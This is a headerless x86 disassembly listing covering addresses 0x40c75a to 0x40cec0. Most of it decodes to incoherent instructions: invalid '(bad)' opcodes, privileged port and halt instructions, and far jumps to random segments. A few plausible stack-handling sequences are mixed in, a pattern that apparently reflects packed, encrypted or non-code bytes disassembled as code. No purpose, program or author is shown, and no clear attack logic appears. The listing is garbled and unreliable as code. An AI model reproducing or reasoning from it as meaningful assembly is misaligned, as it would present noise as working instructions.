  40c75a:	cdq    
  40c75b:	arpl   dx,dx
  40c75d:	add    eax,0xad6550e5
  40c762:	mov    gs,WORD PTR [edx-0x3a]
  40c765:	mov    bl,0x11
  40c767:	and    al,0x1d
  40c769:	adc    al,0x2b
  40c76b:	jecxz  0x40c742
  40c76d:	daa    
  40c76e:	pop    edx
  40c76f:	and    dl,BYTE PTR [esi+0x63a52c65]
  40c775:	mov    edi,0xf180e660
  40c77a:	and    bl,0x62
  40c77d:	(bad)  
  40c77e:	dec    esp
  40c77f:	(bad)  
  40c780:	je     0x40c728
  40c782:	xchg   edx,eax
  40c783:	add    DWORD PTR cs:0x31c8681c,ebp
  40c78a:	int    0xb
  40c78c:	inc    ebp
  40c78d:	dec    ebx
  40c78e:	cmp    DWORD PTR [ecx],esp
  40c790:	push   eax
  40c791:	ins    DWORD PTR es:[edi],dx
  40c792:	inc    ecx
  40c793:	pushf  
  40c794:	jmp    0x40c75d
  40c796:	iret   
  40c797:	cmp    BYTE PTR [ebp-0x6ea66db8],0x23
  40c79e:	xor    eax,0xb9e28307
  40c7a3:	xchg   esp,eax
  40c7a4:	jp     0x40c819
  40c7a6:	inc    esp
  40c7a7:	pop    ebx
  40c7a8:	fdiv   QWORD PTR [esi+edx*2+0xaf3de9c]
  40c7af:	jb     0x40c7eb
  40c7b1:	xchg   edi,eax
  40c7b2:	call   0x2d66:0x7332bed7
  40c7b9:	adc    dl,BYTE PTR [ebx]
  40c7bb:	mov    BYTE PTR ds:0x988d233b,ah
  40c7c1:	jmp    0x40c83e
  40c7c3:	jno    0x40c832
  40c7c5:	retf   0xc0fa
  40c7c8:	mov    dl,0xe9
  40c7ca:	push   esi
  40c7cb:	int3   
  40c7cc:	outs   dx,BYTE PTR ss:[esi]
  40c7ce:	jo     0x40c75b
  40c7d0:	fistp  WORD PTR [esi+ecx*1-0x500e4303]
  40c7d7:	lods   al,BYTE PTR ds:[esi]
  40c7d8:	and    eax,DWORD PTR [esi]
  40c7da:	xchg   edx,eax
  40c7db:	(bad)  
  40c7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7dd:	mov    dl,0xc6
  40c7df:	cmp    al,0x3b
  40c7e1:	stos   DWORD PTR es:[edi],eax
  40c7e2:	fptan  
  40c7e4:	clc    
  40c7e5:	mov    esp,ebp
  40c7e7:	cmc    
  40c7e8:	mov    edi,fs
  40c7ea:	add    al,0x4
  40c7ec:	(bad)  
  40c7ed:	out    0xac,eax
  40c7ef:	mov    eax,ds:0xf580e1c5
  40c7f4:	test   al,0x9f
  40c7f6:	mov    ebx,0xff5a54a3
  40c7fb:	call   0x53f1:0x1125dabe
  40c802:	rcr    BYTE PTR [ecx-0x77],1
  40c805:	xchg   edx,eax
  40c806:	cs adc al,0x6d
  40c809:	bound  edx,QWORD PTR [edx]
  40c80b:	mov    dh,0xc7
  40c80d:	cli    
  40c80e:	adc    ebp,DWORD PTR [esi]
  40c810:	xor    edi,DWORD PTR [esi]
  40c812:	jae    0x40c814
  40c814:	pop    ebx
  40c815:	frstor [ebx+0x5e126b7d]
  40c81b:	xlat   BYTE PTR ds:[ebx]
  40c81c:	hlt    
  40c81d:	push   ss
  40c81e:	outs   dx,BYTE PTR ds:[esi]
  40c81f:	push   ds
  40c820:	hlt    
  40c821:	mov    ds:0x347d905b,al
  40c826:	and    ecx,DWORD PTR [eax+0x28]
  40c829:	addr16 popa 
  40c82b:	ror    dl,cl
  40c82d:	repz fadd st(7),st
  40c830:	adc    al,0x3c
  40c832:	int3   
  40c833:	aas    
  40c834:	ja     0x40c83e
  40c836:	repnz repz mov dl,0x3f
  40c83a:	xchg   esi,eax
  40c83c:	or     BYTE PTR [ebx],ch
  40c83e:	adc    bl,dh
  40c840:	xchg   DWORD PTR [ebp+0x32],edx
  40c843:	imul   esi,DWORD PTR [ecx],0x274bd785
  40c849:	test   al,0xe4
  40c84b:	es inc edi
  40c84d:	imul   BYTE PTR [ebx+0x5f28c4b9]
  40c853:	dec    ebx
  40c854:	cmp    al,0xe6
  40c856:	jg     0x40c811
  40c858:	lea    ebx,[eax+0x10]
  40c85b:	cdq    
  40c85c:	xchg   esp,eax
  40c85d:	in     al,0x4e
  40c85f:	mov    bh,0x1e
  40c861:	pop    edx
  40c862:	add    ebx,DWORD PTR ds:0x21cd8a88
  40c868:	out    0xfb,eax
  40c86a:	(bad)  
  40c86b:	out    0xe4,eax
  40c86d:	cmp    eax,DWORD PTR [edx]
  40c86f:	in     al,0x13
  40c871:	ins    BYTE PTR es:[edi],dx
  40c872:	sbb    ch,BYTE PTR [ebp+0x63]
  40c875:	sub    esp,DWORD PTR [eax]
  40c877:	das    
  40c878:	mov    edx,0xf2a2b2cc
  40c87d:	mov    gs,WORD PTR [esi]
  40c87f:	push   cs
  40c880:	ins    BYTE PTR es:[edi],dx
  40c881:	bound  edx,QWORD PTR [ebx]
  40c883:	mov    ebp,0xd66b1e01
  40c888:	fidivr WORD PTR [esi+eax*4+0x458b3963]
  40c88f:	or     al,0x3
  40c891:	inc    ebp
  40c892:	or     BYTE PTR [ecx+0x458bf045],cl
  40c898:	in     al,0x85
  40c89a:	ror    BYTE PTR [edi],0x84
  40c89d:	jbe    0x40c8ad
  40c89f:	add    BYTE PTR [eax],al
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x843991c5
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c928
  40c8c7:	scas   al,BYTE PTR es:[edi]
  40c8c8:	jae    0x40c8f4
  40c8ca:	pop    edx
  40c8cb:	add    al,0x88
  40c8cd:	mov    eax,ds:0x14e9509a
  40c8d2:	into   
  40c8d3:	inc    ecx
  40c8d4:	pop    ds
  40c8d5:	(bad)  
  40c8d6:	adc    al,0x22
  40c8d8:	sub    BYTE PTR [edi],ah
  40c8da:	jo     0x40c8a5
  40c8dc:	mov    eax,0x190ac87f
  40c8e1:	inc    ebp
  40c8e2:	lahf   
  40c8e3:	xchg   dl,ah
  40c8e5:	sub    al,0x3e
  40c8e7:	lock pop ecx
  40c8e9:	mov    ?,esi
  40c8eb:	mov    eax,ds:0xc8304613
  40c8f0:	inc    esp
  40c8f1:	pop    ds
  40c8f2:	mov    bh,0xa9
  40c8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8f5:	pop    ebp
  40c8f6:	fild   WORD PTR [ecx+0x49]
  40c8f9:	dec    edi
  40c8fa:	sbb    ebp,DWORD PTR [ebx-0x232bf840]
  40c900:	fwait
  40c901:	jmp    0x3cd0b904
  40c906:	stos   DWORD PTR es:[edi],eax
  40c907:	ins    DWORD PTR es:[edi],dx
  40c908:	stos   DWORD PTR es:[edi],eax
  40c909:	ficom  WORD PTR [eax-0x16]
  40c90c:	ins    DWORD PTR es:[edi],dx
  40c90d:	mov    eax,0xf82842f6
  40c912:	inc    ebx
  40c913:	sub    BYTE PTR [ebp+0x62],dl
  40c916:	push   ecx
  40c917:	ror    BYTE PTR [eax],0xa7
  40c91a:	fist   WORD PTR [eax-0x6d]
  40c91d:	rcr    DWORD PTR [edi+ecx*2+0x308258b7],0x68
  40c925:	cs inc ebx
  40c927:	or     DWORD PTR [edi+ebp*8],edi
  40c92a:	pop    ss
  40c92b:	dec    ecx
  40c92c:	dec    esi
  40c92d:	retf   0x24d2
  40c930:	int    0x49
  40c932:	std    
  40c933:	retf   
  40c934:	shl    DWORD PTR [ecx],0x80
  40c937:	jmp    0x40c8e7
  40c939:	jae    0x40c8cc
  40c93b:	xlat   BYTE PTR ds:[ebx]
  40c93c:	jbe    0x40c966
  40c93e:	nop
  40c93f:	mov    edx,0x80472cf0
  40c944:	push   0xbf42aa7b
  40c949:	scas   al,BYTE PTR es:[edi]
  40c94a:	add    DWORD PTR [ebx],esp
  40c94c:	les    esi,FWORD PTR [esi]
  40c94e:	mov    al,ds:0xe70c3cfe
  40c953:	jb     0x40c974
  40c955:	jp     0x40c95c
  40c957:	cmp    bl,dh
  40c959:	daa    
  40c95a:	aaa    
  40c95b:	add    eax,DWORD PTR [edx]
  40c95d:	popf   
  40c95e:	push   esi
  40c95f:	pop    ebp
  40c960:	popf   
  40c961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c962:	clc    
  40c963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c964:	fsub   st,st(4)
  40c966:	bound  ecx,QWORD PTR [ecx+edi*1+0x76]
  40c96a:	xlat   BYTE PTR ds:[ebx]
  40c96b:	retf   0xf6ea
  40c96e:	fiadd  DWORD PTR [ebp-0x11d73125]
  40c974:	xor    BYTE PTR [esi],0x73
  40c977:	dec    ebx
  40c978:	imul   esp,DWORD PTR [edi+eax*1],0x42
  40c97c:	and    BYTE PTR [ebp-0x53],dh
  40c97f:	(bad)  
  40c980:	dec    edi
  40c981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c982:	jmp    0x40c973
  40c984:	fs push ss
  40c986:	popf   
  40c987:	popf   
  40c988:	xor    ebp,edi
  40c98a:	xchg   ebp,eax
  40c98b:	and    bl,BYTE PTR [ecx+edx*2+0x51]
  40c98f:	mov    al,ds:0x72c5561f
  40c994:	xor    al,0xd7
  40c996:	icebp  
  40c997:	pop    ebx
  40c998:	or     ebp,ebp
  40c99a:	cmc    
  40c99b:	and    eax,0x5b82e4a3
  40c9a0:	mov    bh,0x8
  40c9a2:	inc    eax
  40c9a3:	xchg   ecx,eax
  40c9a4:	(bad)  
  40c9a5:	jb     0x40c929
  40c9a7:	into   
  40c9a8:	sub    DWORD PTR [ecx-0x3cf5f789],0x2d82bd70
  40c9b2:	jno    0x40c9a3
  40c9b4:	popf   
  40c9b5:	fs loopne 0x40ca20
  40c9b8:	ja     0x40c9ad
  40c9ba:	adc    BYTE PTR [eax],dh
  40c9bc:	jbe    0x40c940
  40c9be:	aas    
  40c9bf:	int3   
  40c9c0:	out    0xb3,eax
  40c9c2:	mov    al,ds:0x7bd6d0ed
  40c9c7:	mov    ss,WORD PTR [eax+0x38193e25]
  40c9cd:	adc    BYTE PTR [esi],dl
  40c9cf:	push   0xffffff92
  40c9d1:	jg     0x40c998
  40c9d3:	add    dl,BYTE PTR [esi-0x14]
  40c9d6:	into   
  40c9d7:	jb     0x40c9de
  40c9d9:	fstp   TBYTE PTR [ecx-0x5762d03]
  40c9df:	ror    BYTE PTR [edi+0x655b4c74],1
  40c9e5:	mov    al,ds:0x2e36c918
  40c9ea:	or     al,0xd0
  40c9ec:	xor    edi,ecx
  40c9ee:	mov    eax,ds:0x5c222a5f
  40c9f3:	ja     0x40ca5e
  40c9f5:	in     al,dx
  40c9f6:	(bad)  
  40c9f7:	sar    BYTE PTR ds:0x194f5ac7,cl
  40c9fd:	pusha  
  40c9fe:	adc    BYTE PTR [eax-0x14],ah
  40ca01:	mov    edx,0xe6c01865
  40ca06:	sbb    eax,0x159e949
  40ca0b:	add    BYTE PTR [eax],al
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x62cbc4cf
  40ca1c:	ror    DWORD PTR [eax-0xc],0x7e
  40ca20:	jle    0x40ca61
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca93
  40ca26:	std    
  40ca27:	mov    eax,0xda8c8bbe
  40ca2c:	mov    bh,0xeb
  40ca2e:	jl     0x40c9fb
  40ca30:	and    DWORD PTR [esi+0x15],edx
  40ca33:	jne    0x40c9c8
  40ca35:	pop    es
  40ca36:	or     dl,BYTE PTR [esi-0x66]
  40ca39:	cmc    
  40ca3a:	arpl   WORD PTR [edx+0x49],sp
  40ca3d:	xor    eax,0x2f8b228a
  40ca42:	mov    eax,ds:0x2f0d2a13
  40ca47:	adc    eax,0xd60b2e0d
  40ca4c:	cli    
  40ca4d:	rol    DWORD PTR [edi+0x3cc2d6c8],0x0
  40ca54:	(bad)  
  40ca55:	scas   al,BYTE PTR es:[edi]
  40ca56:	call   0x5c8df560
  40ca5b:	jmp    0x8313c011
  40ca60:	jmp    0x40ca23
  40ca62:	outs   dx,DWORD PTR ds:[esi]
  40ca63:	add    DWORD PTR [edi+0x7d2a18ea],ecx
  40ca69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca6a:	daa    
  40ca6b:	and    eax,0x6ce3c70c
  40ca70:	es push 0xffffff93
  40ca73:	ja     0x40ca22
  40ca75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca76:	mov    cl,0x86
  40ca78:	push   edi
  40ca79:	fdiv   st,st(1)
  40ca7b:	popf   
  40ca7c:	mov    dh,0xeb
  40ca7e:	add    al,0xb7
  40ca80:	fld    DWORD PTR [eax]
  40ca82:	clc    
  40ca83:	adc    DWORD PTR [edi+eax*4+0x49a7c0e8],edi
  40ca8a:	mov    eax,0x2e3b29e3
  40ca8f:	push   ebx
  40ca90:	push   0xffffffd5
  40ca92:	es (bad) 
  40ca94:	sbb    bh,BYTE PTR [eax]
  40ca96:	fcom   QWORD PTR [eax+0x0]
  40ca99:	sbb    eax,0x4bb736a7
  40ca9e:	retf   0xe393
  40caa1:	cmp    al,bl
  40caa3:	leave  
  40caa4:	dec    ebx
  40caa5:	fisttp DWORD PTR [eax+eax*4-0x10]
  40caa9:	add    al,0xd6
  40caab:	add    DWORD PTR [edi-0x10bad58b],ebx
  40cab1:	retf   
  40cab2:	int3   
  40cab3:	pushf  
  40cab4:	and    al,al
  40cab6:	or     DWORD PTR [esi-0x633fb48f],ebx
  40cabc:	mov    esp,0x8e6297be
  40cac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cac2:	push   eax
  40cac3:	popa   
  40cac4:	xor    dl,0x40
  40cac7:	sbb    bl,BYTE PTR [ebp-0x5f]
  40caca:	pop    ebp
  40cacb:	mov    al,0xf8
  40cacd:	add    dl,BYTE PTR [esi-0x4b7ba6ae]
  40cad3:	or     al,0xf7
  40cad5:	test   BYTE PTR [edi+0x2523290d],0x34
  40cadc:	jmp    0x40cb4d
  40cade:	dec    ebp
  40cadf:	mov    dl,0x25
  40cae1:	add    DWORD PTR [esi-0x29eda546],ebp
  40cae7:	out    0xda,eax
  40cae9:	sbb    BYTE PTR [edx+esi*1-0x18],0x1c
  40caee:	stos   DWORD PTR es:[edi],eax
  40caef:	or     edi,esp
  40caf1:	ins    DWORD PTR es:[edi],dx
  40caf2:	inc    eax
  40caf3:	jl     0x40ca93
  40caf5:	and    DWORD PTR [ecx+edi*2+0x6fd6e092],esi
  40cafc:	repnz mov ch,0x9d
  40caff:	dec    edx
  40cb00:	div    BYTE PTR [edx-0x66]
  40cb03:	xchg   edi,eax
  40cb04:	js     0x40cb36
  40cb06:	pop    ds
  40cb07:	retf   
  40cb08:	adc    DWORD PTR [eax+0x13],ecx
  40cb0b:	imul   edi,ebp,0x14
  40cb0e:	sub    al,0xca
  40cb10:	in     eax,dx
  40cb11:	in     eax,0x64
  40cb13:	f2xm1  
  40cb15:	lods   eax,DWORD PTR ds:[esi]
  40cb16:	xor    edi,DWORD PTR [esi-0x62]
  40cb19:	out    0xc1,eax
  40cb1b:	xlat   BYTE PTR ds:[ebx]
  40cb1c:	add    edi,DWORD PTR [ebx+0x14b0e4a2]
  40cb22:	or     DWORD PTR [ebp-0x34379e86],edx
  40cb28:	pop    ebx
  40cb29:	fbld   TBYTE PTR [edi]
  40cb2b:	pop    ebp
  40cb2c:	xor    BYTE PTR [edx],dh
  40cb2e:	iret   
  40cb2f:	test   al,0xf9
  40cb31:	sbb    ebp,edi
  40cb33:	mov    eax,ds:0x85c38286
  40cb38:	je     0x40cabd
  40cb3a:	dec    ebp
  40cb3b:	loopne 0x40cb29
  40cb3d:	rol    bl,1
  40cb3f:	fiadd  DWORD PTR [esp+edi*4+0x76cf09f0]
  40cb46:	inc    BYTE PTR [ebp+0xf]
  40cb49:	ins    DWORD PTR es:[edi],dx
  40cb4a:	jb     0x40cb49
  40cb4c:	push   edi
  40cb4d:	je     0x40cb48
  40cb4f:	or     BYTE PTR [esi],cl
  40cb51:	not    ah
  40cb53:	ss cwde 
  40cb55:	cmp    edi,DWORD PTR [edx+0x775e0fc7]
  40cb5b:	aaa    
  40cb5c:	jg     0x40cbd8
  40cb5e:	lahf   
  40cb5f:	or     BYTE PTR [eax+0x492cc18],bh
  40cb65:	in     al,dx
  40cb66:	pop    ebx
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cbd2
  40cb8b:	and    DWORD PTR [ecx-0x37],eax
  40cb8e:	or     esi,esi
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb41
  40cb97:	mov    ah,0x31
  40cb99:	jmp    0x2c89:0xe3dfc243
  40cba0:	(bad)  
  40cba1:	cmp    eax,0x5b770fd7
  40cba6:	mov    esi,0xd0cd67e4
  40cbab:	lds    edi,FWORD PTR [eax+0x58efa2eb]
  40cbb1:	loop   0x40cba5
  40cbb3:	scas   eax,DWORD PTR es:[edi]
  40cbb4:	std    
  40cbb5:	sar    DWORD PTR [eax+ebp*2-0x7b4ae87b],cl
  40cbbc:	leave  
  40cbbd:	adc    edi,DWORD PTR [esi+0x2e8a1738]
  40cbc3:	mov    eax,DWORD PTR [eax]
  40cbc5:	mov    edx,0xde9cb122
  40cbca:	aaa    
  40cbcb:	mov    al,ds:0xf0577606
  40cbd0:	lods   eax,DWORD PTR cs:[esi]
  40cbd2:	ss add eax,0x8d07cf74
  40cbd8:	push   ss
  40cbd9:	rol    DWORD PTR [eax],1
  40cbdb:	adc    eax,0x19e4de5f
  40cbe0:	sbb    eax,esi
  40cbe2:	dec    esi
  40cbe3:	or     esp,DWORD PTR [esp+ecx*1]
  40cbe6:	test   edi,0x82e2dab7
  40cbec:	mov    ?,WORD PTR [edx-0x3d]
  40cbef:	inc    eax
  40cbf0:	ficomp WORD PTR [esi-0xc]
  40cbf3:	iret   
  40cbf4:	call   0x5cf6:0xd575fd1a
  40cbfb:	or     eax,0xac763b33
  40cc00:	nop
  40cc01:	frstor [edx+0x17421142]
  40cc07:	lods   eax,DWORD PTR ds:[esi]
  40cc08:	pop    ebp
  40cc09:	iret   
  40cc0a:	adc    DWORD PTR [eax],edx
  40cc0c:	mov    esp,DWORD PTR [ebp+0x49]
  40cc0f:	sbb    eax,0xc1ccdda
  40cc14:	imul   edi,DWORD PTR [ebp+0xcb2a785],0x49
  40cc1b:	sbb    ebp,ecx
  40cc1d:	cs dec ebp
  40cc1f:	jmp    0x3126:0x31dc0b54
  40cc26:	(bad)  
  40cc27:	dec    esi
  40cc28:	std    
  40cc29:	icebp  
  40cc2a:	jb     0x40cc00
  40cc2c:	cs out 0x7f,eax
  40cc2f:	xchg   ebp,eax
  40cc30:	(bad)  
  40cc32:	leave  
  40cc33:	add    al,0x72
  40cc35:	cmp    eax,0x88842d45
  40cc3a:	or     cl,BYTE PTR [esi]
  40cc3c:	cmp    BYTE PTR [ebp+0x63561e7c],cl
  40cc42:	xchg   ecx,eax
  40cc43:	dec    edi
  40cc44:	add    al,0x23
  40cc46:	mov    esp,0x7e3ba54f
  40cc4b:	std    
  40cc4c:	(bad)  
  40cc4d:	push   ss
  40cc4e:	test   al,0xfb
  40cc50:	mov    al,ds:0x43d27815
  40cc55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc56:	sub    BYTE PTR [ecx+edx*2],dh
  40cc59:	xchg   esp,eax
  40cc5a:	or     eax,0x6a29d527
  40cc5f:	dec    edx
  40cc60:	jge    0x40cbe9
  40cc62:	lds    edx,FWORD PTR [ebx+0xe]
  40cc65:	pop    eax
  40cc66:	xchg   edx,eax
  40cc67:	xor    ebp,eax
  40cc69:	ds pushf 
  40cc6b:	mov    WORD PTR [edi-0x1fd80087],gs
  40cc71:	dec    eax
  40cc72:	fsub   st,st(5)
  40cc74:	icebp  
  40cc75:	cwde   
  40cc76:	scas   eax,DWORD PTR es:[edi]
  40cc77:	mov    edx,DWORD PTR [edi]
  40cc79:	mov    dl,0x18
  40cc7b:	xor    eax,0xf3c463b7
  40cc80:	dec    ebx
  40cc81:	jnp    0x40cc16
  40cc83:	inc    edx
  40cc84:	hlt    
  40cc85:	imul   eax,DWORD PTR [ecx-0x3c],0xffffff9b
  40cc89:	cmp    eax,0xd2ae22af
  40cc8e:	shl    DWORD PTR [edi-0x74b0484f],cl
  40cc94:	pminub mm2,QWORD PTR [edi+ecx*8]
  40cc98:	rcr    dh,cl
  40cc9a:	xor    cl,BYTE PTR ds:0x94c451aa
  40cca0:	or     eax,0x6a10d519
  40cca5:	bound  edx,QWORD PTR [eax-0x17]
  40cca8:	xor    BYTE PTR [edi],cl
  40ccaa:	retf   0x2e5d
  40ccad:	xchg   edi,eax
  40ccae:	mov    cl,0x62
  40ccb0:	test   eax,0xeb91b828
  40ccb5:	push   es
  40ccb6:	inc    esp
  40ccb7:	repz mov eax,ds:0x203577a8
  40ccbd:	jge    0x40cc62
  40ccbf:	(bad)  
  40ccc0:	addr16 loop 0x40cd3b
  40ccc3:	cld    
  40ccc4:	sbb    DWORD PTR [ebx],esi
  40ccc6:	jge    0x40ccd7
  40ccc8:	mov    ebx,0x42baa7eb
  40cccd:	add    DWORD PTR [ebx+0x4edba747],0x33cd9d53
  40ccd7:	mov    eax,DWORD PTR [ebp-0x4]
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x8cec1d3a
  40ccf1:	or     al,BYTE PTR [eax+0x54]
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cca7
  40ccfd:	or     edi,DWORD PTR [ebp-0x60]
  40cd00:	dec    edx
  40cd01:	mov    ecx,0x85bab67f
  40cd06:	fwait
  40cd07:	stc    
  40cd08:	aad    0xfd
  40cd0a:	out    dx,al
  40cd0b:	idiv   dh
  40cd0d:	xchg   edx,eax
  40cd0e:	mov    eax,db7
  40cd11:	inc    esp
  40cd12:	mov    ch,0xae
  40cd14:	jno    0x40ccd3
  40cd16:	bound  esi,QWORD PTR [ebx]
  40cd18:	gs pop ss
  40cd1a:	clc    
  40cd1b:	add    eax,0xa447e9c6
  40cd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd22:	leave  
  40cd23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd24:	jle    0x40ccd5
  40cd26:	fnstcw WORD PTR [ebx-0x69c5fd4a]
  40cd2c:	jg     0x40ccf2
  40cd2e:	enter  0x1f20,0x9b
  40cd32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd33:	in     al,dx
  40cd34:	add    DWORD PTR [eax],esp
  40cd36:	fdivr  DWORD PTR [edx]
  40cd38:	or     al,0x40
  40cd3a:	pop    ds
  40cd3b:	test   DWORD PTR [ebx-0x772c0476],ebx
  40cd41:	add    DWORD PTR [edi-0x5223234c],0x98de1811
  40cd4b:	lock data16 shl BYTE PTR [ebp-0x55],1
  40cd50:	dec    esi
  40cd51:	(bad)  
  40cd52:	push   ecx
  40cd53:	sbb    eax,0xf877b37c
  40cd58:	mov    bl,0xfc
  40cd5a:	xchg   ecx,eax
  40cd5b:	popa   
  40cd5c:	sbb    al,0x35
  40cd5e:	mov    al,ds:0x5e8058b6
  40cd63:	in     eax,dx
  40cd64:	inc    ecx
  40cd65:	and    eax,0x348a91fb
  40cd6a:	xor    ebx,DWORD PTR [edx+0x2]
  40cd6d:	adc    BYTE PTR [esi-0x4b14bd67],dl
  40cd73:	inc    edx
  40cd74:	or     BYTE PTR [esi+0x28],bh
  40cd77:	mov    ds:0x899eab24,al
  40cd7c:	cmp    ch,0x82
  40cd7f:	stc    
  40cd80:	push   esi
  40cd81:	pop    ds
  40cd82:	add    BYTE PTR [ecx+0x5f],al
  40cd85:	sub    eax,0xe4fca545
  40cd8a:	sbb    eax,0x5fbba199
  40cd8f:	inc    ebp
  40cd90:	cmc    
  40cd91:	shr    DWORD PTR [edi-0x3b874255],1
  40cd97:	repnz sub DWORD PTR [eax],ecx
  40cd9a:	sub    bl,0x7
  40cd9d:	in     al,dx
  40cd9e:	mov    ebx,0x81b97829
  40cda3:	add    DWORD PTR [ebx+edi*4],edi
  40cda6:	arpl   dx,ax
  40cda8:	fsubr  DWORD PTR [edi]
  40cdaa:	in     al,dx
  40cdab:	sbb    bh,BYTE PTR [ebx+edx*4]
  40cdae:	(bad)  
  40cdb0:	les    ecx,FWORD PTR [ebx-0x72c64ffe]
  40cdb6:	jmp    0xb0a5da85
  40cdbb:	or     ecx,ebp
  40cdbd:	mov    esi,0xfb10582b
  40cdc2:	retf   0x485d
  40cdc5:	cmp    BYTE PTR [eax],bh
  40cdc7:	rol    DWORD PTR [eax],cl
  40cdc9:	test   al,0x55
  40cdcb:	dec    ebp
  40cdcc:	out    0xe7,eax
  40cdce:	cmp    DWORD PTR [esi-0x58bdba30],0xffffffff
  40cdd5:	push   edi
  40cdd6:	outs   dx,DWORD PTR ds:[esi]
  40cdd7:	or     edx,DWORD PTR [ebp-0x36]
  40cdda:	test   al,0x91
  40cddc:	mov    ch,0x36
  40cdde:	and    BYTE PTR ds:0xe5ea0c5f,0x32
  40cde5:	add    cl,BYTE PTR [edi+esi*4+0x51]
  40cde9:	mov    ebp,0x9e454354
  40cdee:	add    dl,BYTE PTR ds:0x3b31c534
  40cdf4:	test   eax,0xf346e2c1
  40cdf9:	fwait
  40cdfa:	nop
  40cdfb:	jbe    0x40cd80
  40cdfd:	adc    eax,0xb272b7ff
  40ce02:	fsub   st,st(5)
  40ce04:	sub    BYTE PTR [esi],bh
  40ce06:	cmp    DWORD PTR [edx-0x48],edx
  40ce09:	jmp    0x40cdee
  40ce0b:	push   eax
  40ce0c:	popa   
  40ce0d:	data16 mov ds:0x4fd1c84b,al
  40ce13:	jecxz  0x40ce41
  40ce15:	jo     0x40cde1
  40ce17:	fadd   QWORD PTR [eax+ebp*8-0x23]
  40ce1b:	mov    eax,fs
  40ce1d:	push   es
  40ce1e:	dec    esp
  40ce1f:	fnsave [ecx+0x55]
  40ce22:	mov    eax,ds:0x4064b53e
  40ce27:	xor    BYTE PTR [edx+0x67522c10],dl
  40ce2d:	shl    ah,0x5
  40ce30:	es stos DWORD PTR es:[edi],eax
  40ce32:	imul   ebp,eax,0x3f
  40ce35:	sub    eax,0x7ef4b577
  40ce3a:	lods   al,BYTE PTR ds:[esi]
  40ce3b:	push   edx
  40ce3c:	and    dh,BYTE PTR [ebx]
  40ce3e:	sar    DWORD PTR [edx+0x32729d],0x3
  40ce45:	ret    0x59e9
  40ce48:	add    DWORD PTR [eax],eax
  40ce4a:	add    BYTE PTR [edx-0x52a4f329],dh
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x52125331,eax
  40ce59:	jo     0x40cec7
  40ce5b:	mov    ecx,DWORD PTR [eax+0x7f3f7e7e]
  40ce61:	jle    0x40cee1
  40ce63:	mov    ch,0xfb
  40ce65:	pop    ecx
  40ce66:	dec    esi
  40ce67:	sahf   
  40ce68:	retf   
  40ce69:	push   es
  40ce6a:	and    edx,esp
  40ce6c:	add    ah,bh
  40ce6e:	sbb    DWORD PTR [edi],0x1f24dbeb
  40ce74:	lods   al,BYTE PTR ds:[esi]
  40ce75:	sub    eax,ebx
  40ce77:	fcomi  st,st(7)
  40ce79:	sbb    eax,0xf4ec63ca
  40ce7e:	jns    0x40cee4
  40ce80:	pop    edx
  40ce81:	out    0xb6,al
  40ce83:	fldl2t 
  40ce85:	jbe    0x40cec1
  40ce87:	loop   0x40ce2e
  40ce89:	xchg   esp,eax
  40ce8a:	mov    WORD PTR [edx-0x32],cs
  40ce8d:	sar    ah,0x32
  40ce90:	jbe    0x40cee3
  40ce92:	das    
  40ce93:	je     0x40ce1e
  40ce95:	mov    esp,0xbf976ea5
  40ce9a:	out    0x57,eax
  40ce9c:	fmul   st(3),st
  40ce9e:	dec    esp
  40ce9f:	and    BYTE PTR [ebp+0x7751cf19],al
  40cea5:	jae    0x40ce71
  40cea7:	and    BYTE PTR [eax+ecx*4+0x4cef0633],ch
  40ceae:	xchg   DWORD PTR [ebx+0x42ebb461],edx
  40ceb4:	mov    ecx,0xeaa2b2c9
  40ceb9:	aas    
  40ceba:	mov    ds:0x10dce451,al
  40cebf:	inc    ebp
  40cec0:	retf   
